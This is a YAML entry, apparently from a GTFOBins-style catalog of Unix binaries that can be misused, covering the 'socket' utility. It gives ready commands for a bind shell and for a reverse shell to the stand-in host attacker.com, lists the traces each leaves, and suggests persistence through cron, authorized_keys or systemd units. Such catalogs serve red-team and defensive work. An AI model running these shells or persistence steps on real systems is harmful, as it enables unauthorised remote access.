---
name: socket
capabilities:
- exec
- bind
- reverse-shell
required_permissions:
  level: user
difficulty: low
opsec:
  noise: high
  artifacts:
  - ~/.bash_history
  - Network connection logs / firewall logs
  - auditd execve events
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: bind-shell
  description: Open a bind shell on a listening port.
  capabilities:
  - bind
  - exec
  command: socket -svp '/bin/sh -i' 12345
- id: reverse-shell
  description: Initiate a reverse shell to attacker host.
  capabilities:
  - reverse-shell
  - exec
  command: socket -qvp '/bin/sh -i' attacker.com 12345
references:
- https://gtfobins.github.io/gtfobins/socket/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
